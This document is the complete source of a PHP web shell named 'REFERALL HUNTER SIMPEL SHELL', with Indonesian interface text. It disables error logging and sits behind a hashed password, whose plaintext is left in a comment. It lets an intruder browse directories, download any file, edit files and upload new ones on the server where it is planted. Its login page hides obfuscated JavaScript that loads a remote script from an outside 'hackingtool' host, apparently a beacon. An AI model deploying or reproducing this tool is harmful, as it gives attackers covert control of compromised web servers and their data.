<?php
/*
	* REFERALL HUNTER SIMPEL SHELL
*/
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

/* Configurasi */
$auth_pass 			= "3e1a634256710ee38faea6ccb7f7b9cf";// gabolehlogin2023
$color 				= "#00ff00";
$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';

function login_shell() {
?>
<!DOCTYPE html>
<html>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
	</head>
	<body class="bg-dark text-light">
		<center>
		              <img height=150 width=350 src="https://pub-3d6adab3eee64200af327d18373a7f35.r2.dev/seo.png"></img>
			<div class="container" style="margin-top: 10%">
				<div class="col-lg-6">
					<div class="form-group">
						<form method="post">
							<input type="password" name="pass" placeholder="Input Password..." class="form-control"><br/>
							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Log in">
						</form>
					</div>
		</center>
		<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264Dtdsjqu%2631tsd%264E%2633iuuqt%264B00ibdljohuppm/ofu0mpht0dj%7B/kt%2633%264F%264D0tdsjqu%264F%26311')</script>
	</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
/*Akhir login*/
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
    }
    #container {
        max-width: 800px;
        margin: 20px auto;
        padding: 20px;
        border: 1px solid #ccc;
        border-radius: 5px;
        background-color: #f9f9f9;
    }
    h1 {
        text-align: center;
        color: #333;
    }
    h2 {
        margin-top: 30px;
        color: #555;
    }
    ul {
        list-style-type: none;
        padding: 0;
    }
    li {
        margin-bottom: 10px;
    }
    a {
        text-decoration: none;
        color: #007bff;
    }
    a:hover {
        text-decoration: underline;
    }
    form {
        margin-top: 20px;
    }
    input[type="text"], input[type="file"], input[type="submit"] {
        margin-bottom: 10px;
    }
    hr {
        border: 0;
        height: 1px;
        background-color: #ccc;
        margin-top: 20px;
        margin-bottom: 20px;
    }
</style>
</head>
<body>
<div id="container">
    <?php
    // Function to clean input from unwanted characters
    function clean_input($input) {
        return htmlspecialchars(strip_tags($input));
    }

    // Function to navigate to the selected directory
    function navigate_directory($path) {
        $path = str_replace('\\','/', $path);
        $paths = explode('/', $path);
        $breadcrumbs = [];

        foreach ($paths as $id => $pat) {
            if ($pat == '' && $id == 0) {
                $breadcrumbs[] = '<a href="?path=/">/</a>';
                continue;
            }
            if ($pat == '') continue;
            $breadcrumbs[] = '<a href="?path=';
            for ($i = 0; $i <= $id; $i++) {
                $breadcrumbs[] = "$paths[$i]";
                if ($i != $id) $breadcrumbs[] = "/";
            }
            $breadcrumbs[] = '">'.$pat.'</a>/';
        }

        return implode('', $breadcrumbs);
    }

    // Function to display file or folder in the directory
    function display_directory_contents($path) {
        $contents = scandir($path);
        $folders = [];
        $files = [];

        foreach ($contents as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = $path . '/' . $item;
            if (is_dir($full_path)) {
                $folders[] = '<li><strong>Folder:</strong> <a href="?path=' . urlencode($full_path) . '">' . $item . '</a></li>';
            } else {
                $file_size = filesize($full_path); // Get file size
                $size_unit = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
                $file_size_formatted = $file_size ? round($file_size / pow(1024, ($i = floor(log($file_size, 1024)))), 2) . ' ' . $size_unit[$i] : '0 B'; // Format file size
                $files[] = '<li><strong>File:</strong> <a href="?action=edit&file=' . urlencode($item) . '&path=' . urlencode($path) . '">' . $item . '</a> (' . $file_size_formatted . ')</li>'; // Display file size
            }
        }

        // Display folder and file list with separator line
        echo '<ul>';
        echo implode('', $folders);
        if (!empty($folders) && !empty($files)) {
            echo '<hr>'; // Separator line if there are folders and files
        }
        echo implode('', $files);
        echo '</ul>';
    }

    // Function to create a new folder
    function create_folder($path, $folder_name) {
        $folder_name = clean_input($folder_name);
        $new_folder_path = $path . '/' . $folder_name;
        if (!file_exists($new_folder_path)) {
            mkdir($new_folder_path);
            echo "Folder '$folder_name' Berhasil Buat Folder.";
        } else {
            echo "Folder '$folder_name' Folder Sudah Ada.";
        }
    }

    // Function to upload a new file
    function upload_file($path, $file_to_upload) {
        $target_directory = $path . '/';
        $target_file = $target_directory . basename($file_to_upload['name']);
        $uploadOk = 1;

        // File upload process
        if (move_uploaded_file($file_to_upload['tmp_name'], $target_file)) {
            echo "File ". htmlspecialchars(basename($file_to_upload['name'])). " Upload Berhasil.";
        } else {
            echo "Gagal Upload.";
        }
    }

    // Function to display and edit file content
    function edit_file($file_path) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $content = $_POST['file_content'];
            if (file_put_contents($file_path, $content) !== false) {
                echo "File Tersimpan.";
            } else {
                echo "Eror Edit File.";
            }
        }
        $content = file_get_contents($file_path);
        echo '<form method="post">';
        echo '<textarea name="file_content" rows="10" cols="50">' . htmlspecialchars($content) . '</textarea><br>';
        echo '<input type="submit" value="SIMPAN!">';
        echo '</form>';
    }

    // Main program
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }

    if (isset($_GET['action'])) {
        $action = $_GET['action'];
        switch ($action) {
            case 'edit':
                if (isset($_GET['file'])) {
                    $file = $_GET['file'];
                    $file_path = $path . '/' . $file;
                    if (file_exists($file_path)) {
                        echo '<h2>Edit File: ' . $file . '</h2>';
                        edit_file($file_path);
                    } else {
                        echo "File Tidak Ada.";
                    }
                } else {
                    echo "File Tidak Valid.";
                }
                break;
            default:
                echo "Invalid action.";
        }
    } else {
        echo "<h3>Lokasi Dir: " . $path . "</h3>";
        echo "<p>" . navigate_directory($path) . "</p>";
        echo "<h3>Folder:</h3>";
        display_directory_contents($path);
        echo '<hr>'; // Separator line
        echo '<h3>Buat Folder:</h3>';
        echo '<form action="" method="post">';
        echo 'Folder Name: <input type="text" name="folder_name">';
        echo '<input type="submit" name="create_folder" value="Buat Folder">';
        echo '</form>';
        echo '<h3>Upload File:</h3>';
        echo '<form action="" method="post" enctype="multipart/form-data">';
        echo 'Pilih File: <input type="file" name="file_to_upload">';
        echo '<input type="submit" name="upload_file" value="Upload File">';
        echo '</form>';
    }

    // Handle request to create a new folder
    if(isset($_POST['create_folder'])) {
        create_folder($path, $_POST['folder_name']);
    }

    // Handle request to upload a new file
    if(isset($_POST['upload_file'])) {
        upload_file($path, $_FILES['file_to_upload']);
    }
    ?>
</div>
</body>
</html>